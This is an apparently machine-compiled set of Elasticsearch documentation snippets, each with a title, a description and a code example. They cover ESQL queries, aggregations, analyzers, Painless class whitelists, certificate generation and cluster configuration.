ipod, i-pod, i pod => ipod, i-pod, i pod
# If expand==false, "ipod, i-pod, i pod" is equivalent
# to the explicit mapping:
ipod, i-pod, i pod => ipod

----------------------------------------

TITLE: Creating GCE Instance with Custom Elasticsearch Port
DESCRIPTION: This snippet shows how to create a new Google Compute Engine instance with a custom Elasticsearch port specified in the metadata. It includes examples for creating a new instance and creating an instance from an image.

LANGUAGE: sh
CODE:
# when creating first instance
gcloud compute instances create myesnode1 \
       --scopes=compute-rw,storage-full \
       --metadata es_port=9301

# when creating an instance from an image
gcloud compute instances create myesnode2 --image=elasticsearch-1-0-0-RC1 \
       --zone europe-west1-a --machine-type f1-micro --scopes=compute-rw \
       --metadata es_port=9301

----------------------------------------

TITLE: Conditional Rerouting Configuration in Elasticsearch
DESCRIPTION: Example of configuring a reroute processor with a conditional statement using the 'if' option to check for nginx in log file path.

LANGUAGE: javascript
CODE:
{
  "reroute": {
    "tag": "nginx",
    "if" : "ctx?.log?.file?.path?.contains('nginx')",
    "dataset": "nginx"
  }
}

----------------------------------------

TITLE: Filtering Data with RLIKE in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the RLIKE operator in an Elasticsearch SQL query to filter data based on a regular expression pattern. It searches for employees whose first names match the pattern ".leja.*".

LANGUAGE: sql
CODE:
FROM employees
| WHERE first_name RLIKE "\".leja.*\""
| KEEP first_name, last_name

----------------------------------------

TITLE: Output of Whitespace Analyzer in Elasticsearch
DESCRIPTION: This snippet shows the resulting terms produced by the whitespace analyzer when applied to the sample text. Each term is separated by whitespace characters.

LANGUAGE: text
CODE:
[ The, 2, QUICK, Brown-Foxes, jumped, over, the, lazy, dog's, bone. ]

----------------------------------------

TITLE: Sum Aggregation with Missing Values
DESCRIPTION: Demonstrates how to handle missing values in sum aggregations by specifying a default value for documents missing the aggregated field.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "query": {
    "constant_score": {
      "filter": {
        "match": { "type": "hat" }
      }
    }
  },
  "aggs": {
    "hat_prices": {
      "sum": {
        "field": "price",
        "missing": 100
      }
    }
  }
}

----------------------------------------

TITLE: Generating Node Certificate for Elasticsearch in Bash
DESCRIPTION: This snippet creates a certificate for the Elasticsearch node using the previously generated CA. It creates a certificate named 'node' valid for 9999 days, with DNS name 'localhost' and IP addresses '127.0.0.1' and '::1'. The certificate is in PEM format with a 2048-bit key size.

LANGUAGE: bash
CODE:
elasticsearch-certutil cert --name "node" --ca-cert ${PWD}/ca.crt --ca-key ${PWD}/ca.key --days 9999 --dns "localhost" --ip "127.0.0.1" --ip "0:0:0:0:0:0:0:1" --keysize 2048 --out ${PWD}/node.zip --pem 
unzip node.zip
mv node/node.* ./
rmdir node
rm node.zip

----------------------------------------

TITLE: YAML Frontmatter Configuration
DESCRIPTION: YAML configuration block defining mapped pages for the documentation

LANGUAGE: yaml
CODE:
mapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/plugins/current/analysis.html

----------------------------------------

TITLE: Configuring DoubleFieldScript Factory Whitelist
DESCRIPTION: Defines the whitelist entry for DoubleFieldScript Factory class to be used without imports in Painless scripting. Enables factory pattern implementation for double-valued fields.

LANGUAGE: painless
CODE:
class org.elasticsearch.script.DoubleFieldScript$Factory @no_import {}

----------------------------------------

TITLE: Grouping Geo-line Aggregation with Terms
DESCRIPTION: This snippet shows how to perform a geo_line aggregation grouped by terms, specifically by city name, on the previously created time series index.

LANGUAGE: console
CODE:
POST /tour/_search?filter_path=aggregations
{
  "aggregations": {
    "path": {
      "terms": {"field": "city"},
      "aggregations": {
        "museum_tour": {
          "geo_line": {
            "point": {"field": "location"},
            "sort": {"field": "@timestamp"}
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running TDVT Tests for Elasticsearch
DESCRIPTION: Command to execute the TDVT test suite for the Elasticsearch connector. Can be throttled with the -t option for thread allocation on busy machines.

LANGUAGE: bash
CODE:
$TDVT run elastic

----------------------------------------

TITLE: Configuring Request Circuit Breaker in Elasticsearch
DESCRIPTION: YAML configuration for the request circuit breaker in Elasticsearch. It includes settings for the limit and overhead.

LANGUAGE: yaml
CODE:
indices.breaker.request.limit: "60%"
indices.breaker.request.overhead: 1

----------------------------------------

TITLE: Configuring Explicit Synonym Mappings in Elasticsearch
DESCRIPTION: Defines explicit synonym mappings where specific token sequences are replaced with alternatives. These mappings ignore the expand parameter in the schema.

LANGUAGE: plaintext
CODE:
i-pod, i pod => ipod
sea biscuit, sea biscit => seabiscuit

----------------------------------------

TITLE: Default Stoptags Configuration in Nori Token Filter
DESCRIPTION: Default configuration showing the array of part-of-speech tags that are removed by the nori_part_of_speech filter.

LANGUAGE: js
CODE:
"stoptags": [
    "E",
    "IC",
    "J",
    "MAG", "MAJ", "MM",
    "SP", "SSC", "SSO", "SC", "SE",
    "XPN", "XSA", "XSN", "XSV",
    "UNA", "NA", "VSV"
]

----------------------------------------

TITLE: Defining Term Query Function Test in ESQL
DESCRIPTION: This code snippet defines a test case for the Term query function in ESQL. It specifies that the function performs a Term query on a given field and returns true if the provided term matches the row.

LANGUAGE: sql
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Performs a Term query on the specified field. Returns true if the provided term matches the row.

----------------------------------------

TITLE: Configuring Scaling Thread Pool in Elasticsearch
DESCRIPTION: Configuration example for a scaling thread pool type with core, max, and keep_alive parameters defined.

LANGUAGE: yaml
CODE:
thread_pool:
    warmer:
        core: 1
        max: 8
        keep_alive: 2m

----------------------------------------

TITLE: Using Metadata Fields in ESQL Query
DESCRIPTION: This example shows how to use metadata fields in an ESQL query, including filtering, evaluation, sorting, and field selection.

LANGUAGE: esql
CODE:
FROM ul_logs, apps METADATA _index, _version
| WHERE id IN (13, 14) AND _version == 1
| EVAL key = CONCAT(_index, "_", TO_STR(id))
| SORT id, _index
| KEEP id, _index, _version, key

----------------------------------------

TITLE: Using Metadata Fields in ESQL Aggregation
DESCRIPTION: This snippet demonstrates how to use metadata fields in an ESQL aggregation query, where the metadata field is used as a grouping field.

LANGUAGE: esql
CODE:
FROM employees METADATA _index, _id
| STATS max = MAX(emp_no) BY _index

----------------------------------------

TITLE: Combining Cartesian-centroid with Terms Aggregation
DESCRIPTION: This example shows how to use cartesian-centroid as a sub-aggregation to a terms bucket aggregation to find the central location for museums in each city.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggs": {
    "cities": {
      "terms": { "field": "city.keyword" },
      "aggs": {
        "centroid": {
          "cartesian_centroid": { "field": "location" }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Text with Kuromoji Readingform in Elasticsearch
DESCRIPTION: These snippets show how to use the _analyze API with the custom katakana and romaji analyzers. They demonstrate the conversion of Japanese text to katakana and romaji forms.

LANGUAGE: json
CODE:
GET kuromoji_sample/_analyze
{
  "analyzer": "katakana_analyzer",
  "text": "寿司"
}

LANGUAGE: json
CODE:
GET kuromoji_sample/_analyze
{
  "analyzer": "romaji_analyzer",
  "text": "寿司"
}

----------------------------------------

TITLE: Field Writing Operations Class Definition
DESCRIPTION: Defines comprehensive field manipulation methods including value modification, transformation, and nested document handling.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.WriteField {
    String getName()
    boolean exists()
    WriteField move(def)
    WriteField overwrite(def)
    void remove()
    WriteField set(def)
    WriteField append(def)
    boolean isEmpty()
    int size()
    Iterator iterator()
    def get(def)
    def get(int, def)
    boolean hasValue(Predicate)
    WriteField transform(Function)
    WriteField deduplicate()
    WriteField removeValuesIf(Predicate)
    WriteField removeValue(int)
    NestedDocument doc()
    NestedDocument doc(int)
    Iterable docs()
}

----------------------------------------

TITLE: Cumulative Sum Response Example
DESCRIPTION: Illustrates the response format for a cumulative sum aggregation, showing monthly sales values and their running totals over a three-month period.

LANGUAGE: json
CODE:
{
   "took": 11,
   "timed_out": false,
   "_shards": ...,
   "hits": ...,
   "aggregations": {
      "sales_per_month": {
         "buckets": [
            {
               "key_as_string": "2015/01/01 00:00:00",
               "key": 1420070400000,
               "doc_count": 3,
               "sales": {
                  "value": 550.0
               },
               "cumulative_sales": {
                  "value": 550.0
               }
            },
            {
               "key_as_string": "2015/02/01 00:00:00",
               "key": 1422748800000,
               "doc_count": 2,
               "sales": {
                  "value": 60.0
               },
               "cumulative_sales": {
                  "value": 610.0
               }
            },
            {
               "key_as_string": "2015/03/01 00:00:00",
               "key": 1425168000000,
               "doc_count": 2,
               "sales": {
                  "value": 375.0
               },
               "cumulative_sales": {
                  "value": 985.0
               }
            }
         ]
      }
   }
}

----------------------------------------

TITLE: Creating Custom Analyzer with HTML Strip Filter
DESCRIPTION: Creates a new index with a custom analyzer that incorporates the html_strip character filter. Demonstrates basic configuration for HTML stripping in analysis chain.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "keyword",
          "char_filter": [
            "html_strip"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Regression Configuration Example
DESCRIPTION: Example showing regression inference configuration with field mapping and custom results field

LANGUAGE: javascript
CODE:
{
  "inference":{
    "model_id": "my_model_id",
    "field_map": {
      "original_fieldname": "expected_fieldname"
    },
    "inference_config": {
      "regression": {
        "results_field": "my_regression"
      }
    }
  }
}

----------------------------------------

TITLE: Defining DateTimeParseException in Painless
DESCRIPTION: Defines the DateTimeParseException class for handling parsing errors in date-time operations.

LANGUAGE: java
CODE:
class java.time.format.DateTimeParseException {
  (String,CharSequence,int)
  int getErrorIndex()
  String getParsedString()
}

----------------------------------------

TITLE: Using Proper Boolean Parsing in Elasticsearch
DESCRIPTION: Recommends using org.elasticsearch.core.Booleans#parseBoolean(java.lang.String) for parsing boolean values from strings or system properties, instead of the potentially misleading java.lang.Boolean#getBoolean(java.lang.String).

LANGUAGE: java
CODE:
@defaultMessage use org.elasticsearch.core.Booleans#parseBoolean(java.lang.String)
java.lang.Boolean#getBoolean(java.lang.String)

----------------------------------------

TITLE: Describing MIN_Y Function for Geometries in Elasticsearch ESQL
DESCRIPTION: This snippet provides a description of the MIN_Y function in Elasticsearch's ESQL. It explains that the function extracts the minimum value of y coordinates from a supplied geometry, which is equivalent to the minimum latitude for geo_point or geo_shape types.

LANGUAGE: markdown
CODE:
**Description**

Extracts the minimum value of the `y` coordinates from the supplied geometry. If the geometry is of type `geo_point` or `geo_shape` this is equivalent to extracting the minimum `latitude` value.

----------------------------------------

TITLE: Configuring Time Series End Time
DESCRIPTION: Setting to define the latest acceptable @timestamp value for the index.

LANGUAGE: properties
CODE:
index.time_series.end_time: "2023-12-31T23:59:59Z"

----------------------------------------

TITLE: ESQL Enrichment with Column Mapping
DESCRIPTION: Example showing how to use a different column name for matching with the ON keyword.

LANGUAGE: esql
CODE:
ROW a = "1"
| ENRICH languages_policy ON a

----------------------------------------

TITLE: Long Field Type Duplicates in ESQL
DESCRIPTION: Demonstrates how long field types preserve duplicate values in multivalued fields, unlike keyword fields.

LANGUAGE: console
CODE:
PUT /mv
{
  "mappings": {
    "properties": {
      "b": {"type": "long"}
    }
  }
}

POST /mv/_bulk?refresh
{ "index" : {} }
{ "a": 1, "b": [2, 2, 1] }
{ "index" : {} }
{ "a": 2, "b": [1, 1] }

POST /_query
{
  "query": "FROM mv | LIMIT 2"
}

----------------------------------------

TITLE: Analyzing Text with Whitespace Analyzer in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the whitespace analyzer to tokenize a sample text. It sends a POST request to the _analyze endpoint with the analyzer and text specified.

LANGUAGE: console
CODE:
POST _analyze
{
  "analyzer": "whitespace",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Boxplot with Missing Value Handling
DESCRIPTION: Shows how to handle missing values in boxplot aggregations by specifying a default value for documents missing the target field.

LANGUAGE: console
CODE:
GET latency/_search
{
  "size": 0,
  "aggs": {
    "grade_boxplot": {
      "boxplot": {
        "field": "grade",
        "missing": 10
      }
    }
  }
}

----------------------------------------

TITLE: Restricting IndexReader Reference Management in Lucene
DESCRIPTION: This snippet advises against manual reference management for IndexReader, recommending the use of SearcherManager instead.

LANGUAGE: java
CODE:
org.apache.lucene.index.IndexReader#decRef()
org.apache.lucene.index.IndexReader#incRef()
org.apache.lucene.index.IndexReader#tryIncRef()

----------------------------------------

TITLE: Defining String Literal Grammar in Painless
DESCRIPTION: Grammar definition for string literals in Painless, supporting both single and double quoted strings with escape sequences.

LANGUAGE: text
CODE:
STRING: ( '"'  ( '\\"'  | '\\\\' | ~[\\] )*? '"'  )
      | ( '\'' ( '\\\'' | '\\\\' | ~[\\'] )*? '\'' );

----------------------------------------

TITLE: Calculating Spatial Extent for Geometry Field in Elasticsearch ESQL
DESCRIPTION: This SQL query demonstrates the usage of the ST_EXTENT function to calculate the spatial extent (bounding box) of a geometry field named 'shape'. The function is applied to all rows and returns a single bounding box encompassing all geometries in the field.

LANGUAGE: sql
CODE:
SELECT ST_EXTENT(shape) AS extent FROM test

----------------------------------------

TITLE: Apache License 2.0 Copyright Notice Template
DESCRIPTION: Standard boilerplate copyright notice template for applying Apache License 2.0 to software projects. Includes placeholders for year and copyright owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Creating PostgreSQL Connector via API
DESCRIPTION: API call to create a new PostgreSQL connector in Elasticsearch

LANGUAGE: console
CODE:
PUT _connector/my-postgresql-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from PostgreSQL",
  "service_type": "postgresql"
}

----------------------------------------

TITLE: RoundingMode Enum Definition in Painless
DESCRIPTION: Defines the RoundingMode enumeration with its constants and methods for specifying different rounding behaviors in decimal arithmetic.

LANGUAGE: java
CODE:
class java.math.RoundingMode {
  RoundingMode CEILING
  RoundingMode DOWN
  RoundingMode FLOOR
  RoundingMode HALF_DOWN
  RoundingMode HALF_EVEN
  RoundingMode HALF_UP
  RoundingMode UNNECESSARY
  RoundingMode UP
  RoundingMode valueOf(String)
  RoundingMode[] values()
}

----------------------------------------

TITLE: Defining ByteOrder Class in Java NIO
DESCRIPTION: Defines the ByteOrder class with two static fields for big-endian and little-endian byte orders.

LANGUAGE: Java
CODE:
class java.nio.ByteOrder {
  ByteOrder BIG_ENDIAN
  ByteOrder LITTLE_ENDIAN
}

----------------------------------------

TITLE: Defining Right Substring Extraction Function Test in Elasticsearch SQL
DESCRIPTION: This code snippet defines the test case for the 'right' function in Elasticsearch SQL. It specifies the function name, its parameters, and expected behavior for extracting characters from the right side of a string.

LANGUAGE: sql
CODE:
RIGHT(str, length) -> substring

----------------------------------------

TITLE: Term Query for Unsigned Long in Elasticsearch
DESCRIPTION: This snippet illustrates a term query to search for documents with a specific unsigned long value in the 'my_counter' field.

LANGUAGE: console
CODE:
GET /my_index/_search
{
    "query": {
        "term" : {
            "my_counter" : 18446744073709551615
        }
    }
}

----------------------------------------

TITLE: ESQL Enrichment with Column Renaming
DESCRIPTION: Example showing how to rename the enriched columns using field aliases.

LANGUAGE: esql
CODE:
ROW a = "1"
| ENRICH languages_policy ON a WITH name = language_name

----------------------------------------

TITLE: Terms Aggregation with Script
DESCRIPTION: Example using a runtime field to customize term values during aggregation

LANGUAGE: console
CODE:
GET /_search
{
  "size": 0,
  "runtime_mappings": {
    "normalized_genre": {
      "type": "keyword",
      "script": """
        String genre = doc['genre'].value;
        if (doc['product'].value.startsWith('Anthology')) {
          emit(genre + ' anthology');
        } else {
          emit(genre);
        }
      """
    }
  },
  "aggs": {
    "genres": {
      "terms": {
        "field": "normalized_genre"
      }
    }
  }
}

----------------------------------------

TITLE: Score Context Script Execution
DESCRIPTION: Example demonstrating script execution in score context to calculate custom document scores.

LANGUAGE: json
CODE:
POST /_scripts/painless/_execute
{
  "script": {
    "source": "doc['rank'].value / params.max_rank",
    "params": {
      "max_rank": 5.0
    }
  },
  "context": "score",
  "context_setup": {
    "index": "my-index-000001",
    "document": {
      "rank": 4
    }
  }
}

----------------------------------------

TITLE: Double Type Conversion Function Documentation
DESCRIPTION: Function that converts various input types to double values. Date values are converted to milliseconds since Unix epoch as doubles, boolean true becomes 1.0, and false becomes 0.0.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nConverts an input value to a double value. If the input parameter is of a date type, its value will be interpreted as milliseconds since the [Unix epoch](https://en.wikipedia.org/wiki/Unix_time), converted to double. Boolean `true` will be converted to double `1.0`, `false` to `0.0`.

----------------------------------------

TITLE: Declaring Dynamic Settings in Elasticsearch Java
DESCRIPTION: This snippet demonstrates how to declare a dynamic setting in Elasticsearch using the Setting class with Property.Dynamic. It includes the creation of a local volatile variable and registration with ClusterSettings for immediate application of dynamic changes.

LANGUAGE: java
CODE:
public static final Setting<Float> THRESHOLD_SETTING =
    Setting.floatSetting("cluster.routing.allocation.balance.threshold", 1.0f,
        0.0f, Property.Dynamic, Property.NodeScope);

private volatile float threshold;

BalancedShardsAllocator(Settings settings, ClusterSettings clusterSettings) {
    this.threshold = THRESHOLD_SETTING.get(settings);
    clusterSettings.addSettingsUpdateConsumer(THRESHOLD_SETTING, this::setThreshold);
}

----------------------------------------

TITLE: SQL Comments Example
DESCRIPTION: Shows both single-line and multi-line comment syntax in SQL.

LANGUAGE: sql
CODE:
-- single line comment
/* multi
   line
   comment
   that supports /* nested comments */
   */

----------------------------------------

TITLE: Defining GeoShapeDocValuesField Class in Java for Elasticsearch
DESCRIPTION: This class, GeoShapeDocValuesField, is nested within GeoShapeWithDocValuesFieldMapper and provides methods for retrieving GeoShapeValue objects. It includes two overloaded 'get' methods, one of which takes an additional integer parameter.

LANGUAGE: Java
CODE:
class org.elasticsearch.xpack.spatial.index.mapper.GeoShapeWithDocValuesFieldMapper$GeoShapeDocValuesField {
  GeoShapeValues.GeoShapeValue get(GeoShapeValues.GeoShapeValue)
  GeoShapeValues.GeoShapeValue get(int, GeoShapeValues.GeoShapeValue)
}

----------------------------------------

TITLE: Defining DecimalStyle Class in Painless
DESCRIPTION: Defines the DecimalStyle class with methods for customizing decimal formatting in date-time representations.

LANGUAGE: java
CODE:
class java.time.format.DecimalStyle {
  DecimalStyle STANDARD
  Set getAvailableLocales()
  char getDecimalSeparator()
  char getNegativeSign()
  char getPositiveSign()
  char getZeroDigit()
  DecimalStyle of(Locale)
  DecimalStyle ofDefaultLocale()
  DecimalStyle withDecimalSeparator(char)
  DecimalStyle withNegativeSign(char)
  DecimalStyle withPositiveSign(char)
  DecimalStyle withZeroDigit(char)
}

----------------------------------------

TITLE: Median Function Test Case in Elasticsearch ESQL
DESCRIPTION: This SQL snippet demonstrates the usage of the median function in Elasticsearch ESQL. It converts a multivalued field into a single valued field containing the median value. The test case is automatically generated and should not be manually edited.

LANGUAGE: sql
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Using BigInteger for Unsigned Long in Elasticsearch Scripts
DESCRIPTION: This snippet demonstrates how to treat an unsigned long field as BigInteger in Elasticsearch scripts, which is useful for handling values beyond the range of signed long.

LANGUAGE: js
CODE:
"script": {
    "source": "field('my_counter').asBigInteger(BigInteger.ZERO)"
}

----------------------------------------

TITLE: Describing Base64 Decoding Function in Elasticsearch ESQL
DESCRIPTION: This snippet provides a brief description of the base64 decoding function in Elasticsearch's ESQL. It indicates that the function is used to decode a base64 encoded string.

LANGUAGE: markdown
CODE:
**Description**

Decode a base64 string.

----------------------------------------

TITLE: ESQL Enrichment with Field Selection
DESCRIPTION: Example demonstrating how to explicitly select which enrich fields to add using the WITH keyword.

LANGUAGE: esql
CODE:
ROW a = "1"
| ENRICH languages_policy ON a WITH language_name

----------------------------------------

TITLE: Customizing Stop Filter with Case-Insensitive English Stop Words
DESCRIPTION: This example creates a custom case-insensitive Stop filter that removes stop words from the _english_ stop words list.

LANGUAGE: console
CODE:
PUT /my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "default": {
          "tokenizer": "whitespace",
          "filter": [ "my_custom_stop_words_filter" ]
        }
      },
      "filter": {
        "my_custom_stop_words_filter": {
          "type": "stop",
          "ignore_case": true
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic Terms Aggregation
DESCRIPTION: Simple example showing how to use terms aggregation on a genre field

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "genres": {
      "terms": { "field": "genre" }
    }
  }
}

----------------------------------------

TITLE: Merging Multiple Synonym Mapping Entries in Elasticsearch
DESCRIPTION: Demonstrates how multiple synonym mapping entries for the same term are merged into a single mapping with multiple alternatives.

LANGUAGE: plaintext
CODE:
foo => foo bar
foo => baz
# is equivalent to
foo => foo bar, baz

----------------------------------------

TITLE: Calculating Hyperbolic Tangent using TANH in ESQL
DESCRIPTION: Demonstrates how to use the TANH function to calculate the hyperbolic tangent of a numeric value. The example creates a row with a double value and applies the TANH function to it, returning both the input and output values.

LANGUAGE: esql
CODE:
ROW a=1.8
| EVAL tanh=TANH(a)

----------------------------------------

TITLE: Running Elasticsearch Node with Data Preservation
DESCRIPTION: Starts an Elasticsearch node manually with data preservation enabled, avoiding repeated data restoration on node restarts.

LANGUAGE: shell
CODE:
./gradlew :x-pack:plugin:eql:qa:correctness:runEqlCorrectnessNode --debug-jvm --preserve-data

----------------------------------------

TITLE: Creating and Indexing Float Rank Vectors in Elasticsearch
DESCRIPTION: Demonstrates how to create an index with a rank_vectors field using float elements, and index a document with multiple vectors.

LANGUAGE: console
CODE:
PUT my-rank-vectors-float
{
  "mappings": {
    "properties": {
      "my_vector": {
        "type": "rank_vectors"
      }
    }
  }
}

PUT my-rank-vectors-float/_doc/1
{
  "my_vector" : [[0.5, 10, 6], [-0.5, 10, 10]]
}

----------------------------------------

TITLE: Defining GeoShapeValue Class in Elasticsearch X-Pack Spatial Module (Java)
DESCRIPTION: This code snippet defines an empty class named GeoShapeValue within the GeoShapeValues inner class. It is part of Elasticsearch's X-Pack spatial module, likely used for representing and manipulating geospatial shape data in index field data structures.

LANGUAGE: Java
CODE:
class org.elasticsearch.xpack.spatial.index.fielddata.GeoShapeValues$GeoShapeValue {
}

----------------------------------------

TITLE: Numeric DocValues Field Implementations
DESCRIPTION: Defines field types for handling numeric values including integers, longs, doubles, floats, and scaled numbers.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.IntegerDocValuesField @dynamic_type {
  int get(int)
  int get(int, int)
}

class org.elasticsearch.script.field.LongDocValuesField @dynamic_type {
  long get(long)
  long get(int, long)
}

class org.elasticsearch.script.field.DoubleDocValuesField @dynamic_type {
  double get(double)
  double get(int, double)
}

----------------------------------------

TITLE: Math Ceiling Function Implementation Note
DESCRIPTION: Describes the behavior of a ceiling function that rounds numbers up to the nearest integer. For long and integer types, it performs no operation. For double values, it finds the closest double value to the integer, similar to Java's Math.ceil() function.



----------------------------------------

TITLE: Synthetic Source Example for Geopoint Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates the behavior of synthetic source with geo_point fields, showing how geopoints are sorted and reduced to their stored precision.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "point": { "type": "geo_point" }
    }
  }
}
PUT idx/_doc/1
{
  "point": [
    {"lat":-90, "lon":-80},
    {"lat":10, "lon":30}
  ]
}

----------------------------------------

TITLE: Defining Tangent Function in Elasticsearch ESQL
DESCRIPTION: This snippet defines the tangent function for use in Elasticsearch's ESQL. It calculates the tangent of an angle, which is a fundamental trigonometric operation.

LANGUAGE: latex
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Analyzing DNS Query Patterns with ESQL
DESCRIPTION: Query that analyzes DNS logs to find high numbers of unique DNS queries per registered domain. Uses GROK pattern matching and aggregation to identify potentially suspicious query patterns.

LANGUAGE: esql
CODE:
FROM logs-*
| GROK dns.question.name "%{DATA}\\.%{GREEDYDATA:dns.question.registered_domain:string}"
| STATS unique_queries = COUNT_DISTINCT(dns.question.name) BY dns.question.registered_domain, process.name
| WHERE unique_queries > 10
| SORT unique_queries DESC
| RENAME unique_queries AS `Unique Queries`, dns.question.registered_domain AS `Registered Domain`, process.name AS `Process`

----------------------------------------

TITLE: Range Aggregation with Runtime Field in Elasticsearch
DESCRIPTION: Demonstrates using a runtime field to apply a currency conversion before performing the range aggregation.

LANGUAGE: console
CODE:
GET sales/_search
{
  "runtime_mappings": {
    "price.euros": {
      "type": "double",
      "script": {
        "source": """
          emit(doc['price'].value * params.conversion_rate)
        """,
        "params": {
          "conversion_rate": 0.835526591
        }
      }
    }
  },
  "aggs": {
    "price_ranges": {
      "range": {
        "field": "price.euros",
        "ranges": [
          { "to": 100 },
          { "from": 100, "to": 200 },
          { "from": 200 }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Elasticsearch Certificate Generation Command Syntax
DESCRIPTION: Shows the complete command syntax for elasticsearch-certgen including all available parameters and options.

LANGUAGE: shell
CODE:
bin/elasticsearch-certgen
(([--cert <cert_file>] [--days <n>] [--dn <name>] [--key <key_file>]
[--keysize <bits>] [--pass <password>] [--p12 <password>])
| [--csr])
[-E <KeyValuePair>] [-h, --help] [--in <input_file>] [--out <output_file>]
([-s, --silent] | [-v, --verbose])

----------------------------------------

TITLE: Calculating Weighted Average Salary in ESQL
DESCRIPTION: This ESQL query calculates the weighted average of employee salaries using height as the weight, grouped by the number of languages spoken. It then rounds the result, keeps only relevant columns, and sorts by the number of languages.

LANGUAGE: esql
CODE:
FROM employees
| STATS w_avg = WEIGHTED_AVG(salary, height) by languages
| EVAL w_avg = ROUND(w_avg)
| KEEP w_avg, languages
| SORT languages

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to a work. Includes copyright notice and standard license text with placeholders for customization.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: MBR Function Description
DESCRIPTION: Auto-generated documentation for the MBR (Minimum Bounding Rectangle) function that determines the minimum bounding box of a provided geometry input.

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Determines the minimum bounding box of the supplied geometry.

----------------------------------------

TITLE: Generating Node Certificates Signed by CA
DESCRIPTION: Script to create new node certificates signed by the CA. Includes steps to generate certificates in PEM format and convert them to PKCS12 format. Configures DNS for localhost and specific node names.

LANGUAGE: bash
CODE:
export i=1 # update this
rm -rf certificate-bundle.zip public-cert$i.pem private-cert$i.key private-cert$i.p12 instance
bin/elasticsearch-certutil cert -ca-key private-ca.key -ca-cert public-ca.pem -days 7305 -pem -dns localhost,es$i -ip 127.0.0.1,::1
unzip certificate-bundle.zip
mv instance/instance.crt public-cert$i.pem
mv instance/instance.key private-cert$i.key
openssl pkcs12 -export -out private-cert$i.p12 -inkey private-cert$i.key -in public-cert$i.pem -passout pass: #convert public/private key to p12

----------------------------------------

TITLE: Static Import for IP Field Script Emit Function in Elasticsearch
DESCRIPTION: Defines a static import for the 'emit' function, which is used as a callback to collect values for IP fields in Painless scripts.

LANGUAGE: painless
CODE:
static_import {
    # The `emit` callback to collect values for the field
    void emit(org.elasticsearch.script.IpFieldScript, String) bound_to org.elasticsearch.script.IpFieldScript$Emit
}

----------------------------------------

TITLE: ESQL Type Compatibility Table
DESCRIPTION: A detailed markdown table showing the supported field types, query types, and their resulting boolean output. This reference helps developers understand valid type combinations when working with ESQL functions.

LANGUAGE: markdown
CODE:
| field | query | result |
| --- | --- | --- |
| boolean | boolean | boolean |
| boolean | keyword | boolean |
| date | date | boolean |
| date | keyword | boolean |
| date_nanos | date_nanos | boolean |
| date_nanos | keyword | boolean |
| double | double | boolean |
| double | integer | boolean |
| double | keyword | boolean |
| double | long | boolean |
| integer | double | boolean |
| integer | integer | boolean |
| integer | keyword | boolean |
| integer | long | boolean |
| ip | ip | boolean |
| ip | keyword | boolean |
| keyword | keyword | boolean |
| long | double | boolean |
| long | integer | boolean |
| long | keyword | boolean |
| long | long | boolean |
| text | keyword | boolean |
| unsigned_long | double | boolean |
| unsigned_long | integer | boolean |
| unsigned_long | keyword | boolean |
| unsigned_long | long | boolean |
| unsigned_long | unsigned_long | boolean |
| version | keyword | boolean |
| version | version | boolean |

----------------------------------------

TITLE: Defining and Using Pass-through Objects in Elasticsearch
DESCRIPTION: This snippet demonstrates how to define a pass-through object in an Elasticsearch index mapping, index a document with the pass-through object, and query the data using both direct field references and full path references.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "attributes": {
        "type": "passthrough",
        "priority": 10,
        "properties": {
          "id": {
            "type": "keyword"
          }
        }
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "attributes" : {
    "id": "foo",
    "zone": 10
  }
